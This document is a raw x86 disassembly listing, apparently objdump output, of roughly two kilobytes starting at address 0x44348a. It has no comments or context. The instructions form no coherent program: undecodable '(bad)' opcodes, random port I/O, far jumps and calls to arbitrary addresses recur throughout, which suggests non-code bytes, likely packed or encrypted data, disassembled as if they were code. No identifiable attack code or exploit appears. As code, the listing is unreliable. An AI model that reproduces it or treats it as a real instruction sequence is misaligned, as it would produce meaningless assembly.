  44348a:	mov    bh,0x69
  44348c:	pop    ecx
  44348d:	(bad)  
  44348e:	pop    ebp
  44348f:	add    eax,DWORD PTR [edi-0x70d6cf23]
  443495:	(bad)  
  443496:	lods   eax,DWORD PTR ds:[esi]
  443497:	out    0xa8,al
  443499:	test   BYTE PTR [ecx+0x513dbe83],0xfa
  4434a0:	adc    esi,DWORD PTR [eax+0x68]
  4434a3:	or     DWORD PTR [eax-0x4a],edx
  4434a6:	xor    ecx,DWORD PTR [ecx-0x61]
  4434a9:	push   0xfc457233
  4434ae:	push   esi
  4434af:	and    eax,0x489c38d6
  4434b4:	out    dx,eax
  4434b5:	xor    eax,0x88c581d4
  4434ba:	mov    ds:0x691c077d,eax
  4434bf:	push   cs
  4434c0:	jp     0x4434c3
  4434c2:	lds    edx,FWORD PTR [edx-0x18d06b5c]
  4434c8:	sbb    BYTE PTR [edi-0x26f06f20],ch
  4434ce:	and    eax,0x1a920087
  4434d3:	(bad)  
  4434d4:	out    dx,eax
  4434d5:	nop
  4434d6:	xor    DWORD PTR [edi+0x7b5fbf30],eax
  4434dc:	cmc    
  4434dd:	pop    ss
  4434de:	ds aam 0x81
  4434e1:	pop    esi
  4434e2:	sub    al,0xc2
  4434e4:	fwait
  4434e5:	int3   
  4434e6:	pusha  
  4434e7:	and    BYTE PTR [edx+0x7cb52fd0],0x88
  4434ee:	cmp    al,0xdf
  4434f0:	pop    edi
  4434f1:	repnz xor eax,0x784c59e9
  4434f7:	sub    al,0x18
  4434f9:	adc    eax,DWORD PTR [edi+0x3a]
  4434fc:	test   DWORD PTR [eax+ebp*8+0x61],0x34b76897
  443504:	push   ebp
  443505:	xor    DWORD PTR [esi+eax*4+0x33],ecx
  443509:	cmp    al,0xcb
  44350b:	jmp    0xaa557cc9
  443510:	dec    esp
  443511:	xchg   ebx,eax
  443512:	fisubr DWORD PTR [edx-0x23036b54]
  443518:	dec    ebp
  443519:	ss or  bl,bh
  44351c:	das    
  44351d:	xchg   ecx,eax
  44351e:	adc    al,0x66
  443520:	repnz cmp eax,0xca1797bb
  443526:	cmp    al,0xc4
  443528:	xor    eax,ebx
  44352a:	imul   edi,DWORD PTR [edx-0xadeac8c],0xb8a30938
  443534:	mov    ds:0x79497b81,eax
  443539:	pop    eax
  44353a:	mov    ds:0x3a1a3bdd,eax
  44353f:	scas   eax,DWORD PTR es:[edi]
  443540:	cli    
  443541:	inc    edx
  443542:	loopne 0x4434e6
  443544:	xor    eax,0x821bf217
  443549:	repz dec eax
  44354b:	mov    ah,0xbf
  44354d:	sbb    eax,0x3ef283bf
  443552:	and    BYTE PTR ds:0x1649dada,bh
  443558:	arpl   WORD PTR [edx],si
  44355a:	push   eax
  44355b:	repnz scas eax,DWORD PTR es:[edi]
  44355d:	nop
  44355e:	fnstenv [bp+si+0x2b]
  443562:	adc    dl,BYTE PTR [ebx+0x3bf4aabc]
  443568:	addr16 jae 0x44359b
  44356b:	in     eax,dx
  44356c:	and    eax,0x31004ac7
  443571:	stc    
  443572:	ja     0x44352a
  443574:	and    bl,BYTE PTR [ebx+0x427697a2]
  44357a:	fimul  DWORD PTR [ebp+esi*1-0x49830285]
  443581:	sbb    esp,ecx
  443583:	jmp    0x5b7e:0xd540d04d
  44358a:	dec    ebx
  44358b:	lock mov ch,0x86
  44358e:	in     al,0x73
  443590:	mov    edx,esi
  443592:	cmp    eax,0x9b77c50c
  443597:	and    al,0xad
  443599:	imul   esi,DWORD PTR [ebp+0x16],0xd9053448
  4435a0:	jle    0x4435a8
  4435a2:	or     BYTE PTR [ebx-0x7e],bl
  4435a5:	cmova  ebp,DWORD PTR [ecx-0x2]
  4435a9:	fisttp DWORD PTR [ebx+0x451f2a69]
  4435af:	popf   
  4435b0:	cmp    dh,bh
  4435b2:	int    0xd1
  4435b4:	retf   
  4435b5:	xor    dh,BYTE PTR [ecx]
  4435b7:	push   ecx
  4435b8:	(bad)  
  4435ba:	in     al,0xfb
  4435bc:	sbb    DWORD PTR [ebp-0x7e],edi
  4435bf:	test   BYTE PTR [ebx+0x255b6001],bh
  4435c5:	mov    bl,0xca
  4435c7:	stc    
  4435c8:	out    0x86,al
  4435ca:	or     BYTE PTR [ecx+0x7f],dl
  4435cd:	inc    eax
  4435ce:	push   0x5a
  4435d0:	fcomp  DWORD PTR ds:0x6925bf7
  4435d6:	inc    eax
  4435d7:	push   0x6f
  4435d9:	dec    ebx
  4435da:	ret    0x66ad
  4435dd:	in     al,0x38
  4435df:	lea    ecx,[edx+0xd39794]
  4435e5:	imul   ebp,DWORD PTR [ebx+0x77],0x23
  4435e9:	(bad)  
  4435ea:	fistp  WORD PTR [ecx]
  4435ec:	ins    BYTE PTR es:[edi],dx
  4435ed:	dec    ebp
  4435ee:	push   ecx
  4435ef:	in     eax,0x3c
  4435f1:	(bad)  
  4435f3:	cwde   
  4435f4:	jle    0x44359e
  4435f6:	push   es
  4435f7:	pop    ss
  4435f8:	add    esp,ecx
  4435fa:	ror    DWORD PTR [ecx-0x1019cd00],cl
  443600:	dec    edi
  443601:	jmp    0x4435ef
  443603:	sub    al,0x99
  443605:	cmp    cl,BYTE PTR ds:0x6ddc3ecd
  44360b:	dec    eax
  44360c:	mov    edx,?
  44360e:	(bad)  
  44360f:	aas    
  443610:	mov    eax,DWORD PTR [edx-0x5fed84ba]
  443616:	shr    ebx,cl
  443618:	jmp    0x44365c
  44361a:	jmp    DWORD PTR [ecx+0x46]
  44361d:	adc    eax,0xd942efe3
  443622:	sahf   
  443623:	pop    edx
  443624:	cmp    DWORD PTR [esi-0x29],edx
  443627:	or     DWORD PTR [edx+edx*8],esp
  44362a:	mov    edx,0xf965f63a
  44362f:	fisub  DWORD PTR [eax-0x7b]
  443632:	dec    edx
  443633:	pusha  
  443634:	xchg   ebp,eax
  443635:	ins    BYTE PTR es:[edi],dx
  443636:	push   esi
  443637:	dec    edi
  443638:	out    dx,al
  443639:	jmp    0x289e40d
  44363e:	cdq    
  44363f:	jge    0x44363d
  443641:	pop    edi
  443642:	jne    0x443646
  443644:	sbb    DWORD PTR [ebx-0x36bfac57],ecx
  44364a:	les    ecx,FWORD PTR [edx+0x27]
  44364d:	out    dx,al
  44364e:	sub    eax,0xca754e4c
  443653:	push   0xffffffb0
  443655:	sub    DWORD PTR [ecx],eax
  443657:	out    dx,al
  443658:	pusha  
  443659:	pop    esi
  44365a:	push   ss
  44365b:	cmp    BYTE PTR [ecx+0x22],cl
  44365e:	(bad)  
  44365f:	sbb    ebp,DWORD PTR [edi-0x29878a74]
  443665:	and    BYTE PTR [ebp-0x783bf450],dl
  44366b:	sbb    dl,BYTE PTR es:[ebx+ecx*2+0x763ec7a2]
  443673:	retf   
  443674:	jl     0x44360a
  443676:	hlt    
  443677:	pop    esi
  443678:	adc    ebp,DWORD PTR [ebx]
  44367a:	int    0x9e
  44367c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44367d:	sbb    al,BYTE PTR [ebx]
  44367f:	in     al,dx
  443680:	fs pop eax
  443682:	xchg   DWORD PTR [eax-0x4d541781],esp
  443688:	shl    DWORD PTR [eax+0x3cc1b74],0x50
  44368f:	sbb    DWORD PTR [edi],ecx
  443691:	xor    eax,0x31c9ffa7
  443696:	pop    esi
  443697:	sub    BYTE PTR ds:0xbf040bf8,0x3e
  44369e:	aam    0xa
  4436a0:	pop    edi
  4436a1:	xlat   BYTE PTR ds:[ebx]
  4436a2:	sbb    DWORD PTR [esp+esi*4],ebp
  4436a5:	adc    DWORD PTR [ecx+ebp*1],0xeb893bd3
  4436ac:	jmp    0x46c0d400
  4436b1:	adc    bl,al
  4436b3:	xlat   BYTE PTR ds:[ebx]
  4436b4:	adc    al,0x66
  4436b6:	int    0xe2
  4436b8:	xor    al,0x6a
  4436ba:	mov    ah,0xb6
  4436bc:	jnp    0x4436a3
  4436be:	sbb    BYTE PTR [esi+0x69],dh
  4436c1:	call   0x5d92d2d5
  4436c6:	cmp    BYTE PTR [esi-0x29],ch
  4436c9:	sbb    al,0x77
  4436cb:	mov    esi,0x64f5d195
  4436d0:	adc    al,0xc6
  4436d2:	xor    eax,0xf1b47d59
  4436d7:	popf   
  4436d8:	xchg   dh,dh
  4436da:	xlat   BYTE PTR ds:[ebx]
  4436db:	mov    bl,0x23
  4436dd:	lods   eax,DWORD PTR ds:[esi]
  4436de:	cmp    esi,DWORD PTR [ebp-0x46]
  4436e1:	push   edi
  4436e2:	ins    BYTE PTR es:[edi],dx
  4436e3:	scas   eax,DWORD PTR es:[edi]
  4436e4:	imul   edi,ebx,0xa0d63e8c
  4436ea:	mov    DWORD PTR [edx+0x74],ebx
  4436ed:	inc    edi
  4436ee:	fdivr  QWORD PTR ss:[esi-0x3666d07e]
  4436f5:	dec    edi
  4436f6:	(bad)  
  4436f7:	push   esi
  4436f8:	push   ebx
  4436f9:	mov    ebx,0xd897e43b
  4436fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4436ff:	pop    ds
  443700:	rcl    BYTE PTR [edi+0xa],1
  443703:	loopne 0x44371e
  443705:	sbb    dh,bh
  443707:	call   0x49e1:0x106d1476
  44370e:	or     eax,0x25608863
  443713:	add    BYTE PTR [ecx-0x20],cl
  443716:	cmp    al,BYTE PTR [ebx+0x258e6f45]
  44371c:	inc    eax
  44371d:	imul   edi,DWORD PTR [edi+0x9],0xffffffd9
  443721:	les    edi,FWORD PTR [ebx-0x3d]
  443724:	sbb    eax,0x655e90ae
  443729:	lods   al,BYTE PTR ds:[esi]
  44372a:	cmp    esi,edi
  44372c:	mov    ds,WORD PTR [esi]
  44372e:	mov    ebp,0x14200d39
  443733:	test   esp,edi
  443735:	sbb    ebx,0x2441b8da
  44373b:	popa   
  44373c:	imul   DWORD PTR [ecx+0x26]
  44373f:	js     0x4436ce
  443741:	mov    ?,WORD PTR [edx-0x6e650006]
  443747:	retf   0x8cc1
  44374a:	leave  
  44374b:	xor    ebx,ecx
  44374d:	mov    dh,0x5f
  44374f:	sti    
  443750:	sbb    al,0xa0
  443752:	les    ebx,FWORD PTR [eax]
  443754:	out    dx,eax
  443755:	in     eax,0x43
  443757:	lods   eax,DWORD PTR ds:[esi]
  443758:	dec    eax
  443759:	pop    eax
  44375a:	pop    ds
  44375b:	jo     0x4437ad
  44375d:	add    esi,DWORD PTR [ebx-0x26700d36]
  443763:	or     ecx,DWORD PTR [eax+0x59]
  443766:	ror    BYTE PTR [ecx],cl
  443768:	add    eax,0x677c3c5
  44376d:	mov    esi,0xa96134cf
  443772:	rol    edi,cl
  443774:	mov    bl,0x39
  443776:	lahf   
  443777:	add    eax,0x5f8e6bf8
  44377c:	out    0xdf,al
  44377e:	jns    0x443719
  443780:	aad    0x63
  443782:	inc    ebp
  443783:	popf   
  443784:	rcr    BYTE PTR [esi+ebp*2],1
  443787:	ror    BYTE PTR [eax+0x6f],1
  44378a:	repz cmp BYTE PTR [ebx],bl
  44378d:	sahf   
  44378e:	xchg   edx,eax
  44378f:	cmp    al,0xaa
  443791:	jl     0x443805
  443793:	lea    edx,[ecx]
  443795:	push   edi
  443796:	lds    ebp,FWORD PTR [edi]
  443798:	in     al,dx
  443799:	inc    edi
  44379a:	add    BYTE PTR [eax-0x37],al
  44379d:	cmp    BYTE PTR [ebp+eax*8+0x1d],0xed
  4437a2:	loopne 0x443786
  4437a4:	jl     0x4437f3
  4437a6:	cmc    
  4437a7:	push   ds
  4437a8:	sub    al,0x6c
  4437aa:	enter  0x2d5d,0x6c
  4437ae:	addr16 sbb al,0x64
  4437b1:	ja     0x443816
  4437b3:	dec    esp
  4437b4:	push   edi
  4437b5:	or     cl,BYTE PTR [esi-0x52681dca]
  4437bb:	pop    es
  4437bc:	dec    esi
  4437bd:	pop    edi
  4437be:	out    dx,eax
  4437bf:	xchg   edi,eax
  4437c0:	pop    esp
  4437c1:	mov    edx,0x29bd90b0
  4437c6:	and    al,BYTE PTR [edi+0x65]
  4437c9:	retf   0x1844
  4437cc:	xor    BYTE PTR [ecx+0x4bb14c5a],dl
  4437d2:	nop
  4437d3:	into   
  4437d4:	int    0xe1
  4437d6:	aaa    
  4437d7:	cmc    
  4437d8:	jg     0x4437a4
  4437da:	sub    al,0x64
  4437dc:	in     al,0xbb
  4437de:	lea    esp,[edx-0x42]
  4437e1:	jge    0x443811
  4437e3:	xchg   ebp,eax
  4437e4:	adc    DWORD PTR [eax+edi*4-0xc],ebp
  4437e8:	int3   
  4437e9:	lods   al,BYTE PTR ds:[esi]
  4437ea:	adc    eax,0x685911b
  4437ef:	jb     0x443844
  4437f1:	repz clc 
  4437f3:	cld    
  4437f4:	push   0x1c8b10
  4437f9:	push   ebx
  4437fa:	push   0xffffff8e
  4437fc:	or     ah,BYTE PTR ds:[ecx+ebp*8+0x5d]
  443801:	dec    esi
  443802:	lahf   
  443803:	dec    ebp
  443804:	mov    ds:0x5d6b407,eax
  443809:	sub    edx,ecx
  44380b:	std    
  44380c:	leave  
  44380d:	shl    DWORD PTR [ecx],0x9d
  443810:	jbe    0x443795
  443812:	pop    ebp
  443813:	sahf   
  443814:	test   DWORD PTR [edi-0x17],ebp
  443817:	push   ebx
  443818:	mov    edx,ecx
  44381a:	mov    ebp,0xa38bc269
  44381f:	dec    ebx
  443820:	adc    BYTE PTR [ebp-0x21],bh
  443823:	mov    ebp,0x898323ea
  443828:	pop    edx
  443829:	cmp    al,0x7f
  44382b:	mov    esi,0xaef138de
  443830:	aas    
  443831:	fdivr  DWORD PTR [edx+0x1e]
  443834:	out    0xc2,eax
  443836:	(bad)  
  443837:	out    dx,eax
  443838:	xchg   ecx,eax
  443839:	mov    DWORD PTR [esi+0x5e315767],esp
  44383f:	call   0x1015:0xcf5c67b8
  443846:	inc    ebp
  443847:	sar    BYTE PTR ds:0x37dcd65e,0x9b
  44384e:	sbb    DWORD PTR ds:0xdc956964,edi
  443854:	inc    esp
  443855:	mov    ebx,0x4ef9e15
  44385a:	mov    bh,0x55
  44385c:	sub    eax,0xc8a87c9c
  443861:	mov    ah,0x1a
  443863:	les    esp,FWORD PTR [esi]
  443865:	in     al,0x79
  443867:	loopne 0x4437fc
  443869:	adc    edi,eax
  44386b:	xlat   BYTE PTR ds:[ebx]
  44386c:	inc    esi
  44386d:	xor    cl,0x18
  443870:	cmp    al,0x6e
  443872:	gs in  al,0x82
  443875:	xor    BYTE PTR [ebp+0x47],0x2b
  443879:	jl     0x44381f
  44387b:	jb     0x443801
  44387d:	inc    eax
  44387e:	aam    0x49
  443880:	shl    DWORD PTR [ebp+eax*1-0x61],cl
  443884:	shr    cl,0x83
  443887:	stos   DWORD PTR es:[edi],eax
  443888:	jb     0x44384a
  44388a:	push   edi
  44388b:	push   es
  44388c:	nop
  44388d:	jb     0x44386a
  44388f:	iret   
  443890:	sbb    eax,0x64216095
  443895:	pop    edi
  443896:	mov    ds:0x586615d2,al
  44389b:	sahf   
  44389c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44389d:	mov    ch,0xaa
  44389f:	dec    esi
  4438a0:	add    eax,0x1362f7e0
  4438a5:	jae    0x4438ae
  4438a7:	test   eax,0xd973c752
  4438ac:	push   edi
  4438ad:	push   edi
  4438ae:	loop   0x44385d
  4438b0:	nop
  4438b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4438b2:	jmp    0x18b1:0xe6ae3339
  4438b9:	push   esi
  4438ba:	or     BYTE PTR [ecx+0x33],al
  4438bd:	ins    BYTE PTR es:[edi],dx
  4438be:	mov    BYTE PTR [ebp+ebp*4+0x452d5b5c],dl
  4438c5:	mov    ebx,0xc8be1a06
  4438ca:	(bad)  
  4438cc:	jge    0x4438b9
  4438ce:	int3   
  4438cf:	fdivr  QWORD PTR [esi+0x12]
  4438d2:	scas   eax,DWORD PTR es:[edi]
  4438d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4438d4:	cwde   
  4438d5:	xor    dh,BYTE PTR [eax-0x5]
  4438d8:	popa   
  4438d9:	mov    ebx,0xffebbb4
  4438de:	jmp    0x3b98:0x3934786e
  4438e5:	xchg   esp,eax
  4438e6:	(bad)  
  4438e7:	cmp    eax,0x995bd522
  4438ec:	mov    cl,0x50
  4438ee:	jmp    0x443894
  4438f0:	mov    bl,0xf2
  4438f2:	inc    ebp
  4438f3:	ror    BYTE PTR [ecx],cl
  4438f5:	jb     0x4438f8
  4438f7:	jge    0x4438e0
  4438f9:	mov    bh,0x13
  4438fb:	stos   BYTE PTR es:[edi],al
  4438fc:	jg     0x443956
  4438fe:	xchg   esp,eax
  4438ff:	mov    ch,0x3a
  443901:	jl     0x443937
  443903:	(bad)  
  443904:	sub    al,0x9d
  443906:	scas   al,BYTE PTR es:[edi]
  443907:	xor    bl,cl
  443909:	add    ebp,0x51597a3a
  44390f:	inc    eax
  443910:	loop   0x4438b8
  443912:	xor    ecx,esi
  443914:	push   ebp
  443915:	mov    ebp,0x5293584c
  44391a:	mov    dl,0x61
  44391c:	imul   eax,DWORD PTR [bp+di],0xffffffb8
  443920:	fwait
  443921:	jl     0x4438a9
  443923:	and    DWORD PTR [eax+ebx*8-0x41],edx
  443927:	jno    0x4439a1
  443929:	jbe    0x443954
  44392b:	add    DWORD PTR [edx],esi
  44392d:	xor    eax,DWORD PTR [ecx]
  44392f:	or     eax,0x153e80e7
  443934:	bound  edx,QWORD PTR [eax+0x3c]
  443937:	fsincos 
  443939:	enter  0x3d94,0xd0
  44393d:	arpl   cx,si
  44393f:	push   cs
  443940:	je     0x4438f6
  443942:	mov    bl,0x2c
  443944:	and    eax,0xf2343356
  443949:	mov    ds:0xf236efe1,al
  44394e:	repz es push ebp
  443951:	mov    WORD PTR es:[edi],gs
  443954:	pop    ebp
  443956:	popa   
  443957:	jg     0x443998
  443959:	je     0x443942
  44395b:	sub    ebx,edx
  44395d:	sbb    edi,DWORD PTR ds:0x29332bac
  443963:	dec    esi
  443964:	imul   edx,DWORD PTR ds:0x1abf3596,0x6041666a
  44396f:	(bad)
  443973:	js     0x4439c7
  443975:	sbb    eax,edi
  443977:	xor    DWORD PTR [eax-0x6],ebp
  44397a:	popf   
  44397b:	and    dh,ch
  44397d:	js     0x44399b
  44397f:	adc    eax,0xe34c902
  443984:	lods   eax,DWORD PTR ds:[esi]
  443985:	or     edx,DWORD PTR [edi]
  443987:	push   ebp
  443988:	push   esp
  443989:	cmp    al,0xde
  44398b:	sub    ebx,eax
  44398d:	xchg   ecx,eax
  44398e:	cli    
  44398f:	pop    esi
  443990:	iret   
  443991:	jmp    0x227f7ad7
  443996:	adc    BYTE PTR [esi-0x60b6204a],0x8e
  44399d:	mov    edx,0xd539b6aa
  4439a2:	and    BYTE PTR [ebp-0x73],dl
  4439a5:	push   cs
  4439a6:	rcl    ah,1
  4439a8:	dec    eax
  4439a9:	pop    eax
  4439aa:	mov    bl,0xae
  4439ac:	sti    
  4439ad:	mov    al,0xe9
  4439af:	mov    ecx,0x95e9abe9
  4439b4:	sbb    edx,ebp
  4439b6:	push   0x994133d7
  4439bb:	ficomp DWORD PTR [ebx]
  4439bd:	mov    al,ds:0x8c77075e
  4439c2:	sub    dl,BYTE PTR [ecx]
  4439c4:	fidivr WORD PTR [eax]
  4439c6:	pop    esp
  4439c7:	xor    BYTE PTR [ecx],ch
  4439c9:	sbb    esp,esi
  4439cb:	jecxz  0x4439a2
  4439cd:	push   ds
  4439ce:	sbb    ecx,DWORD PTR [ebp-0x2]
  4439d1:	or     bl,dh
  4439d3:	mov    cs,WORD PTR [ebp-0x25]
  4439d6:	outs   dx,DWORD PTR ds:[esi]
  4439d7:	call   0xb4d2acd2
  4439dc:	adc    al,0x90
  4439de:	pop    es
  4439df:	dec    esi
  4439e0:	xchg   ecx,eax
  4439e1:	mov    BYTE PTR [edi-0x8],al
  4439e4:	jnp    0x4439c8
  4439e6:	fisub  DWORD PTR [ebx]
  4439e8:	xchg   edx,eax
  4439e9:	clc    
  4439ea:	jecxz  0x443a36
  4439ec:	cmp    DWORD PTR [edx+0x2a25250e],ecx
  4439f2:	aaa    
  4439f3:	les    edx,FWORD PTR [ebx+0x3486e16]
  4439f9:	push   ebx
  4439fa:	lea    esi,[edx+0x41]
  4439fd:	adc    edx,edi
  4439ff:	adc    esp,ecx
  443a01:	add    al,0x94
  443a03:	mov    ah,0x8e
  443a05:	xchg   edi,eax
  443a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443a07:	inc    edx
  443a08:	pushf  
  443a09:	aas    
  443a0a:	test   al,0x1f
  443a0c:	sbb    ebx,DWORD PTR ds:0xe09c5fa2
  443a12:	lahf   
  443a13:	pop    eax
  443a14:	cdq    
  443a15:	and    esi,esi
  443a17:	fisub  DWORD PTR [ebx+0x7a]
  443a1a:	gs scas al,BYTE PTR es:[edi]
  443a1c:	mov    al,0x99
  443a1e:	and    bh,ah
  443a20:	cmp    BYTE PTR [eax+0x44],bl
  443a23:	(bad)  
  443a24:	cmp    eax,0x46ab93f2
  443a29:	cmp    ebx,ecx
  443a2b:	fwait
  443a2c:	jo     0x443a10
  443a2e:	pop    eax
  443a2f:	repz sub ah,bl
  443a32:	inc    edi
  443a33:	fild   QWORD PTR [eax]
  443a35:	mov    al,0xe8
  443a37:	cmp    al,0xac
  443a39:	pop    eax
  443a3a:	ror    DWORD PTR ds:0x57efc10b,1
  443a40:	push   ebp
  443a41:	dec    esi
  443a42:	or     esp,ebx
  443a44:	addr16 xor edi,ebp
  443a47:	in     al,0xeb
  443a49:	xor    DWORD PTR [edx],eax
  443a4b:	loope  0x443a77
  443a4d:	(bad)  
  443a4e:	aam    0x39
  443a50:	push   ebx
  443a51:	xchg   ecx,eax
  443a52:	je     0x443aac
  443a54:	pop    esi
  443a55:	outs   dx,DWORD PTR ds:[esi]
  443a56:	push   es
  443a57:	mov    edi,0x4830f341
  443a5c:	dec    edx
  443a5d:	js     0x443a7d
  443a5f:	jmp    0x68a673f9
  443a64:	imul   ebx,DWORD PTR [edi],0xba08aaec
  443a6a:	sub    DWORD PTR [ebx],ecx
  443a6c:	loope  0x443a12
  443a6e:	mov    esp,0xce8ef5ba
  443a73:	mov    bl,0xe2
  443a75:	add    DWORD PTR [eax-0x7d936085],esi
  443a7b:	dec    edx
  443a7c:	popf   
  443a7d:	adc    ecx,ecx
  443a7f:	fbld   TBYTE PTR [edx+edi*8]
  443a82:	daa    
  443a83:	aaa    
  443a84:	sub    DWORD PTR [eax+0x60],ebp
  443a87:	pop    ebx
  443a88:	(bad)  
  443a89:	pushf  
  443a8a:	nop
  443a8b:	sub    bh,BYTE PTR [edi-0x7a]
  443a8e:	add    al,0xcb
  443a90:	jecxz  0x443a8b
  443a92:	push   eax
  443a93:	leave  
  443a94:	mov    bl,0xc3
  443a96:	mov    dh,0x82
  443a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443a99:	or     BYTE PTR [edx-0x42],0x14
  443a9d:	push   ebp
  443a9e:	mov    dh,0x6d
  443aa0:	clc    
  443aa1:	jl     0x443a98
  443aa3:	mov    ds:0x549ac557,eax
  443aa8:	lahf   
  443aa9:	fucomip st,st(6)
  443aab:	mov    edi,0x1d1f0dde
  443ab0:	xor    eax,DWORD PTR [edx]
  443ab2:	(bad)  
  443ab3:	jle    0x443a55
  443ab5:	imul   ebp,DWORD PTR [ebp+0x46a4030b],0xc148206a
  443abf:	pop    ebx
  443ac0:	push   DWORD PTR [eax+0x4e]
  443ac3:	aaa    
  443ac4:	push   0x5c77d6cd
  443ac9:	pop    es
  443aca:	and    DWORD PTR [edi],ebx
  443acc:	ja     0x443a93
  443ace:	mov    bh,0x24
  443ad0:	jo     0x443ad8
  443ad2:	pop    ebp
  443ad3:	fucomp st(0)
  443ad5:	test   dh,0x78
  443ad8:	test   eax,0xa10ebd24
  443add:	push   0xb65ec183
  443ae2:	div    DWORD PTR [edi+0x20]
  443ae5:	ins    BYTE PTR es:[edi],dx
  443ae6:	mov    eax,0x98ef6f56
  443aeb:	add    cl,cl
  443aed:	(bad)  
  443aee:	loopne 0x443af6
  443af0:	push   esp
  443af1:	pusha  
  443af2:	pop    eax
  443af3:	repnz adc eax,esi
  443af6:	sub    BYTE PTR gs:[ebp+0x48],0x59
  443afb:	lods   al,BYTE PTR ds:[esi]
  443afc:	xor    eax,0x3257b021
  443b01:	push   cs
  443b02:	push   0x4624afe1
  443b07:	bnd jbe 0x443b1d
  443b0a:	pop    ebx
  443b0b:	fcomp  QWORD PTR [ecx+0x52085d5d]
  443b11:	loope  0x443ae1
  443b13:	and    ah,ah
  443b15:	push   ds
  443b16:	cmp    esi,ebp
  443b18:	fstp   DWORD PTR [edx+eax*4+0x4db532f4]
  443b1f:	and    eax,0x5cec9b1d
  443b24:	mov    ah,0x26
  443b26:	dec    esi
  443b27:	hlt    
  443b28:	es cs mov bh,0xb2
  443b2c:	adc    bl,BYTE PTR [ebx+ecx*1+0x25a87a2d]
  443b33:	jmp    0x443b39
  443b35:	dec    esi
  443b36:	out    0x95,al
  443b38:	sub    esp,DWORD PTR [ebx+0x28]
  443b3b:	retf   
  443b3c:	dec    ebx
  443b3d:	repnz lahf 
  443b3f:	test   al,0xb
  443b41:	retf   0x540d
  443b44:	cmp    eax,0xb3aab68a
  443b49:	jp     0x443b64
  443b4b:	shl    BYTE PTR [ebx-0x7e2e374],cl
  443b51:	cmp    ebx,DWORD PTR [edx]
  443b53:	in     al,0x62
  443b55:	jp     0x443af4
  443b57:	and    dl,0x59
  443b5a:	in     al,dx
  443b5b:	jb     0x443b9c
  443b5d:	and    dl,BYTE PTR [edi+0x734fe26c]
  443b63:	push   ds
  443b64:	xchg   ebx,eax
  443b65:	mov    bh,0x6e
  443b67:	test   al,0xaf
  443b69:	fsubr  QWORD PTR [esp+ebp*4-0x4]
  443b6d:	jl     0x443afa
  443b6f:	das    
  443b70:	neg    DWORD PTR [edi-0x52c13eea]
  443b76:	and    esi,DWORD PTR [ebp+0x34cfab45]
  443b7c:	sub    al,0x1a
  443b7e:	daa    
  443b7f:	test   BYTE PTR [eax],cl
  443b81:	inc    edx
  443b82:	mov    ds:0xebdb6e93,eax
  443b87:	sbb    DWORD PTR [edi-0x52],esi
  443b8a:	push   0xa850ea10
  443b8f:	jmp    0x443bcd
  443b91:	mov    eax,0x2bbb8de8
  443b96:	mov    ebp,0x12b746ea
  443b9b:	sbb    DWORD PTR [eax],ecx
  443b9d:	pop    esi
  443b9e:	fisttp QWORD PTR ds:0x6c6e3023
  443ba4:	sahf   
  443ba5:	dec    esi
  443ba6:	xchg   ebp,eax
  443ba7:	scas   al,BYTE PTR es:[edi]
  443ba8:	ds cld 
  443baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443bab:	int3   
  443bac:	mov    bh,0x2f
  443bae:	cdq    
  443baf:	dec    esi
  443bb0:	arpl   dx,ax
  443bb2:	je     0x443bd4
  443bb4:	aam    0x32
  443bb6:	add    al,bh
  443bb8:	daa    
  443bb9:	outs   dx,BYTE PTR cs:[esi]
  443bbb:	xor    DWORD PTR [edx],edx
  443bbd:	mov    al,0xa5
  443bbf:	mov    WORD PTR [edi-0x75],?
  443bc2:	idiv   esp
  443bc4:	sbb    cl,BYTE PTR [ecx+0x73]
  443bc7:	aaa    
  443bc8:	xor    esp,esi
  443bca:	popa   
  443bcb:	out    0x1c,eax
  443bcd:	ret    0xcd8d
  443bd0:	rcr    DWORD PTR [esi-0x17],1
  443bd3:	or     al,0x9
  443bd5:	outs   dx,DWORD PTR ds:[esi]
  443bd6:	out    0x4e,al
  443bd8:	ret    
  443bd9:	(bad)
  443bdd:	out    dx,eax
  443bde:	jmp    0x443bca
  443be0:	enter  0xc4cb,0x7
  443be4:	sub    ch,dl
  443be6:	add    DWORD PTR [edi+0x25],edx
  443be9:	push   ss
  443bea:	sbb    DWORD PTR [edx+0xebfd5ee],ebp
  443bf0:	inc    eax
  443bf1:	mov    ds:0xd517fa1a,al
  443bf6:	cmp    eax,0x69a1e668
  443bfb:	arpl   WORD PTR [edx],ax
  443bfd:	ret    
  443bfe:	inc    DWORD PTR [ebx-0x38]
  443c01:	pop    ecx
  443c02:	stos   DWORD PTR es:[edi],eax
  443c03:	in     eax,dx
  443c04:	pop    es
  443c05:	push   esp
  443c06:	hlt    
  443c07:	mov    cl,0x2d
  443c09:	repz jnp 0x443c6e
  443c0c:	inc    edx
  443c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c0e:	mov    esi,0x96357a24
  443c13:	pop    ss
  443c14:	xchg   BYTE PTR [esi],al
  443c16:	je     0x443ba4
  443c18:	jno    0x443c09
  443c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c1b:	pop    ebx
  443c1c:	jbe    0x443c0b
  443c1e:	jbe    0x443bda
  443c20:	(bad)  [esi-0x2f]
  443c23:	mov    esi,0x54f4a33e
  443c28:	adc    al,0x9e
  443c2a:	idiv   BYTE PTR [eax-0x27]
  443c2d:	int3   
  443c2e:	lods   al,BYTE PTR ds:[esi]
  443c2f:	(bad)  
  443c30:	sbb    esp,edi
  443c32:	adc    BYTE PTR [ebx],dh
  443c34:	xor    BYTE PTR [ebp+0x1ced4e5d],bh
  443c3a:	shl    BYTE PTR [esi+0x6ff0022],cl
  443c40:	pusha  
  443c41:	pop    eax
  443c42:	mov    esp,0x587f6474
  443c47:	mov    BYTE PTR [ebp+0x3a068d78],dl
  443c4d:	(bad)  
  443c4e:	jmp    0xabae:0x5773460a
  443c55:	fld    TBYTE PTR [edi-0x555ddcc0]
  443c5b:	aas    
  443c5c:	loope  0x443c72
  443c5e:	retf   
  443c5f:	(bad)  
  443c60:	loope  0x443c15
  443c62:	pushf  
  443c63:	addr16 (bad) 
